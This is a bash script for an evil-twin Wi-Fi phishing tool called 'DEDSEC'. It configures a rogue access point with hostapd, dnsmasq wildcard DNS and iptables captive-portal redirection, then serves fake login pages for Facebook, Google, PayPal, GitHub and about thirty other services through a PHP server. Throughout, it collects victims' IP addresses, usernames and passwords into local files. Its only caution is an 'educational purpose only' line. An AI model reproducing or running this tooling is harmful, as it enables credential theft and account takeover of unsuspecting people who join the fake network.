#!/bin/bash

if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi

if [[ ! -d "auth" ]]; then
	mkdir -p "auth"
fi

if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi

check_root() {
	
if [[ "${EUID:-$(id -u)}" -ne 0 ]]; then
    { clear; }
    echo -e "Give root privileges and try again. \n"
    exit 1
fi
	
	
}

install_packages() {
	
if [[ -f hostapd && -f dnsmasq ]]; then
	
{ clear; }	
	
else
	
{ clear; banner; }
	
sudo ./packages.sh 	
	
	
fi
	
}



exit_on_signal_SIGINT() {
    { printf "\n\n%s\n\n" " Program Interrupted." 2>&1; }
    exit 0
}

exit_on_signal_SIGTERM() {
    { printf "\n\n%s\n\n" " Program Terminated." 2>&1; }
    exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

kill_pid() {
	check_PID="php hostapd dnsmasq "
	for process in ${check_PID}; do
		if [[ $(pidof ${process}) ]]; then 
			killall ${process} > /dev/null 2>&1 
		fi
	done
}

banner() {
	cat <<- EOF
			  
			  █████████████████████████████████████0
			  █▄─▄▄▀█▄─▄▄─█▄─▄▄▀█─▄▄▄▄█▄─▄▄─█─▄▄▄─█X
			  ██─██─██─▄█▀██─██─█▄▄▄▄─██─▄█▀█─███▀█B
			  ▀▄▄▄▄▀▀▄▄▄▄▄▀▄▄▄▄▀▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀I
			       </> PHISHING USING WIFI </>         T
	EOF
}

start_1()
{
	
systemctl stop NetworkManager.service	
	
{ clear; echo; }
ethernet="lo"
echo "<+> wifi-adapter:"
iw dev | grep -e Interface
read -p "<+> wifi adapter: " adapter
wifi="$adapter"
	
if [ -f /etc/spoof.hosts ]; then mv /etc/spoof.hosts /etc/spoof.BAK; fi
	
cat <<- EOF
--------------------------------------------
Example wifi name: Free-Internet or 10.0.0.1
--------------------------------------------
EOF
	
	
read -p "<:> WIFI_NAME: " wifi_name
	
ap_name="$wifi_name"
	
echo "10.0.0.1 $wifi_name" >>  /etc/spoof.hosts
echo "</> wifi $wifi_name wait for enable..."
sleep 3
echo ""
	
}
dependencies() {
	echo -e "\n</> Installing required packages..."

    if [[ -d "/data/data/com.termux/files/home" ]]; then
        if [[ ! $(command -v proot) ]]; then
			echo -e "\n</> Installing package :proot"
            pkg install proot resolv-conf -y
        fi

        if [[ ! $(command -v tput) ]]; then
			echo -e "\n</> Installing package : ncurses-utils"
            pkg install ncurses-utils -y
        fi
    fi

	if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) ]]; then
		echo -e "\n</> Packages already installed."
	else
		pkgs=(php curl unzip)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n</> Installing package : $pkg"
				if [[ $(command -v pkg) ]]; then
					pkg install "$pkg" -y
				elif [[ $(command -v apt) ]]; then
					sudo apt install "$pkg" -y
				elif [[ $(command -v apt-get) ]]; then
					sudo apt-get install "$pkg" -y
				elif [[ $(command -v pacman) ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ $(command -v dnf) ]]; then
					sudo dnf -y install "$pkg"
				elif [[ $(command -v yum) ]]; then
					sudo yum -y install "$pkg"
				else
					echo -e "\n<!> Unsupported package manager, Install packages manually."
					{ exit 1; }
				fi
			}
		done
	fi
}

msg_exit() {
	{ clear; banner; echo; }
	echo -e " </> Thank you for using this Dedsec tool.\n"
	{ exit 0; }
}

about() {
	{ clear; banner; echo; }
	cat <<- EOF
		Author  :  0xbitx
		Github  :  https://github.com/0xbitx
		Social  :  https://tiktok.com/@x64.bit

		Warning: This Tool is made for educational purpose 
		only! Author will not be responsible for 
		any misuse of this tool!

		[00] Main Menu    [99] Exit

	EOF

	read -p "</> SELECT :: "
	case $REPLY in 
		99)
			msg_exit;;
		0 | 00)
			echo -ne "\n</> Returning to main menu..."
			{ sleep 1; main_menu; };;
		*)
			echo -ne "\n}<!> Invalid Option, Try Again..."
			{ sleep 1; about; };;
	esac
}

HOST='10.0.0.1'
PORT='80'

setup_site() {
	echo -e "\n</> Setting up server..."
	cp -rf .sites/"$website"/* .server/www
	cp -f .sites/ip.php .server/www/
	echo -ne "\n</> Starting PHP server..."
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
}

capture_ip() {
	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
	IFS=$'\n'
	echo -e "\n<-> Victim's IP :$IP"
	echo -ne "\n<-> Saved in : auth/ip.txt"
	cat .server/www/ip.txt >> auth/ip.txt
}


capture_creds() {
	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
	IFS=$'\n'
	echo -e "------------------------------------"
	echo -e "\n<-> Account :$ACCOUNT"
	echo -e "\n<-> Password : $PASSWORD"
	echo -e "------------------------------------"
	echo -e "\n<-> Saved in : auth/usernames.txt"
	cat .server/www/usernames.txt >> auth/usernames.txt
	echo -ne "\n</> Waiting for Next Login Info [Ctrl + C to exit.] "
}

capture_data() {
	echo -ne "\n</> Waiting for Login Info [Ctrl + C to exit]"
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			echo -e "\n\n<-> Victim IP Found !"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/usernames.txt" ]]; then
			echo -e "\n\n</> Login info Found !!"
			capture_creds
			rm -rf .server/www/usernames.txt
		fi
		sleep 0.75
	done
}

start_localhost() {
	echo -e "\n</> Initializing... [ http://$HOST:$PORT]"
	setup_site
	{ sleep 1; clear;  }
	echo -e "\n</> Successfully Hosted at : http://$HOST:$PORT"
	capture_data
}

tunnel_menu() {
	{ clear; }
	start_localhost
}

site_facebook() {
	cat <<- EOF

		[01] Traditional Login Page
		[02] Advanced Voting Poll Login Page
		[03] Fake Security Login Page
		[04] Facebook Messenger Login Page

	EOF

	read -p " </> SELECT :: "

	case $REPLY in 
		1 | 01)
			website="facebook"
			tunnel_menu;;
		2 | 02)
			website="fb_advanced"
			tunnel_menu;;
		3 | 03)
			website="fb_security"
			tunnel_menu;;
		4 | 04)
			website="fb_messenger"
			tunnel_menu;;
		*)
			echo -ne "\n Invalid Option, Try Again..."
			{ sleep 1; clear; site_facebook; };;
	esac
}

site_instagram() {
	cat <<- EOF

		[01] Traditional Login Page
		[02] Auto Followers Login Page
		[03] 1000 Followers Login Page
		[04] Blue Badge Verify Login Page

	EOF

	read -p " </> SELECT :: "

	case $REPLY in 
		1 | 01)
			website="instagram"
			tunnel_menu;;
		2 | 02)
			website="ig_followers"
			tunnel_menu;;
		3 | 03)
			website="insta_followers"
			tunnel_menu;;
		4 | 04)
			website="ig_verify"
			tunnel_menu;;
		*)
			echo -ne "\n Invalid Option, Try Again..."
			{ sleep 1; clear; site_instagram; };;
	esac
}

site_gmail() {
	cat <<- EOF

		[01] Gmail Old Login Page
		[02] Gmail New Login Page
		[03] Advanced Voting Poll

	EOF

	read -p " </> SELECT :: "

	case $REPLY in 
		1 | 01)
			website="google"
			tunnel_menu;;		
		2 | 02)
			website="google_new"
			tunnel_menu;;
		3 | 03)
			website="google_poll"
			tunnel_menu;;
		*)
			echo -ne "\n Invalid Option, Try Again..."
			{ sleep 1; clear; site_gmail; };;
	esac
}

site_vk() {
	cat <<- EOF

		[01] Traditional Login Page
		[02] Advanced Voting Poll Login Page

	EOF

	read -p " </> SELECT :: "

	case $REPLY in 
		1 | 01)
			website="vk"
			tunnel_menu;;
		2 | 02)
			website="vk_poll"
			tunnel_menu;;
		*)
			echo -ne "\n$ Invalid Option, Try Again..."
			{ sleep 1; clear; site_vk; };;
	esac
}

main_menu() {
	{ clear; banner; echo; }
	cat <<- EOF
		____________________________________________________________
		|                                                          |
		| [01] Facebook     [11] Twitch       [21] DeviantArt      |
		| [02] Instagram    [12] Pinterest    [22] Badoo           |
		| [03] Google       [13] Snapchat     [23] Origin          |
		| [04] Microsoft    [14] Linkedin     [24] DropBox         |
		| [05] Netflix      [15] Ebay         [25] Yahoo           |
		| [06] Paypal       [16] Quora        [26] Wordpress       |
		| [07] Steam        [17] Protonmail   [27] Yandex          |
		| [08] Twitter      [18] Spotify      [28] StackoverFlow   |
		| [09] Playstation  [19] Reddit       [29] Vk              |
		| [10] Tiktok       [20] Adobe        [30] XBOX            |
		| [31] Mediafire    [32] Gitlab       [33] Github          |
		| [34] Discord                                             |
		|                                                          |
		| [99] About        [00] Exit             <DEDSEC-TOOL>    |
		|__________________________________________________________|
        
	EOF
	
	read -p " </> SELECT :: "

	case $REPLY in 
		1 | 01)
			site_facebook;;
		2 | 02)
			site_instagram;;
		3 | 03)
			site_gmail;;
		4 | 04)
			website="microsoft"
			tunnel_menu;;
		5 | 05)
			website="netflix"
			tunnel_menu;;
		6 | 06)
			website="paypal"
			tunnel_menu;;
		7 | 07)
			website="steam"
			tunnel_menu;;
		8 | 08)
			website="twitter"
			tunnel_menu;;
		9 | 09)
			website="playstation"
			tunnel_menu;;
		10)
			website="tiktok"
			tunnel_menu;;
		11)
			website="twitch"
			tunnel_menu;;
		12)
			website="pinterest"
			tunnel_menu;;
		13)
			website="snapchat"
			tunnel_menu;;
		14)
			website="linkedin"
			tunnel_menu;;
		15)
			website="ebay"
			tunnel_menu;;
		16)
			website="quora"
			tunnel_menu;;
		17)
			website="protonmail"
			tunnel_menu;;
		18)
			website="spotify"
			tunnel_menu;;
		19)
			website="reddit"
			tunnel_menu;;
		20)
			website="adobe"
			tunnel_menu;;
		21)
			website="deviantart"
			tunnel_menu;;
		22)
			website="badoo"
			tunnel_menu;;
		23)
			website="origin"
			tunnel_menu;;
		24)
			website="dropbox"
			tunnel_menu;;
		25)
			website="yahoo"
			tunnel_menu;;
		26)
			website="wordpress"
			tunnel_menu;;
		27)
			website="yandex"
			tunnel_menu;;
		28)
			website="stackoverflow"
			tunnel_menu;;
		29)
			site_vk;;
		30)
			website="xbox"
			tunnel_menu;;
		31)
			website="mediafire"
			tunnel_menu;;
		32)
			website="gitlab"
			tunnel_menu;;
		33)
			website="github"
			tunnel_menu;;
		34)
			website="discord"
			tunnel_menu;;
		99)
			about;;
		0 | 00 )
			msg_exit;;
		*)
			echo -ne "\n Invalid Option, Try Again..."
			{ sleep 1; main_menu; };;
	
	esac
}
attack()
{
	
	{ clear; echo; }
	
	echo "[-] starting...    </> setup - [hostapd, captiveportal, iptable, dnsmasq]"
	
	if [ -f /etc/hostapd/hostapd.conf ]; then mv /etc/hostapd/hostapd.conf /etc/hostapd/hostapd.bak; fi
	
	echo "interface=$wifi" >> /etc/hostapd/hostapd.conf
	echo "driver=nl80211" >> /etc/hostapd/hostapd.conf
	echo "ssid=$ap_name" >> /etc/hostapd/hostapd.conf
	echo "hw_mode=g" >> /etc/hostapd/hostapd.conf
	echo "channel=11" >> /etc/hostapd/hostapd.conf
	
	sleep 1
	
	
	if [ -f /etc/dnsmasq.conf ]; then mv /etc/dnsmasq.conf /etc/dnsmasq.bak; fi
	
	echo "no-resolv" >> /etc/dnsmasq.conf
	echo "interface=$wifi" >> /etc/dnsmasq.conf
	echo "dhcp-range=10.0.0.2,10.0.0.101,12h" >> /etc/dnsmasq.conf
	echo "server=8.8.8.8" >> /etc/dnsmasq.conf
	echo "server=8.8.4.4" >> /etc/dnsmasq.conf
	echo "domain=free.wifi" >> /etc/dnsmasq.conf
	echo "address=/fake.local/10.0.0.1" >>  /etc/dnsmasq.conf
	echo "addn-hosts=/etc/spoof.hosts" >>  /etc/dnsmasq.conf
	echo "address=/#/10.0.0.1" >> /etc/dnsmasq.conf
	sleep 1
	
	sudo iptables -t mangle -N captiveportal
	sudo iptables -t mangle -A PREROUTING -i $wifi -p udp --dport 53 -j RETURN
	sudo iptables -t mangle -A PREROUTING -i $wifi -j captiveportal
	sudo iptables -t mangle -A captiveportal -j MARK --set-mark 1
	sudo iptables -t nat -A PREROUTING -i $wifi  -p tcp -m mark --mark 1 -j DNAT --to-destination 10.0.0.1
	sudo xterm -e nohup  sysctl -w net.ipv4.ip_forward=1
	sudo iptables -A FORWARD -i $wifi -j ACCEPT
	sudo iptables -t nat -A POSTROUTING -o $ethernet -j MASQUERADE
	
	ifconfig $wifi up 10.0.0.1 netmask 255.255.255.0
	
	sleep 3
	
	if [ -z "$(ps -e | grep dnsmasq)" ]
	then 
	killall dnsmasq > /dev/null 2>&1
	dnsmasq &
	fi
	
	sleep 1
	
	
	hostapd -B /etc/hostapd/hostapd.conf 1> /dev/null
	
	host='10.0.0.1'
	port='80'
	
	cd .www && php -S "$host":"$port" > /dev/null 2>&1 & 
	
	main_menu
	
	while true; do read $wifi; done
	
	}


control_c()
{
	echo -e "CTRL C \n"
	reset $wifi $ethernet
	exit 1
	}


function reset() {
	
	echo -en "\n</> Reset fake Wifi and exit </> \n"
	
	if [ -f /etc/hostapd/hostapd.bak ]; then mv /etc/hostapd/hostapd.bak /etc/hostapd/hostapd.conf; fi
	sleep 1
	
	if [ -f /etc/dnsmasq.bak ]; then mv /etc/dnsmasq.bak /etc/dnsmasq.conf; fi
	sleep 1
	
	if [ -f /etc/spoof.bak ]; then mv /etc/spoof.bak /etc/spoof.hosts; fi
	sleep 1
	
	sudo iptables -t mangle -D PREROUTING -i $wifi -p udp --dport 53 -j RETURN
	sudo iptables -t mangle -D PREROUTING -i $wifi -j captiveportal
	sudo iptables -t mangle -D captiveportal -j MARK --set-mark 1
	sudo iptables -t nat -D PREROUTING -i $wifi  -p tcp -m mark --mark 1 -j DNAT --to-destination 10.0.0.1
	sudo iptables -D FORWARD -i $wifi -j ACCEPT
	sudo iptables -t nat -D POSTROUTING -o $ethernet -j MASQUERADE
	sudo iptables -t nat -F
	sudo iptables -t nat -X
	sudo iptables -t mangle -F
	sudo iptables -t mangle -X
	sleep 1
	
	systemctl start NetworkManager.service
	sudo service networking restart
	sleep 1
	clear
	exit 1
}

trap control_c SIGINT

check_root
install_packages
kill_pid
dependencies
start_1
attack
main_menu
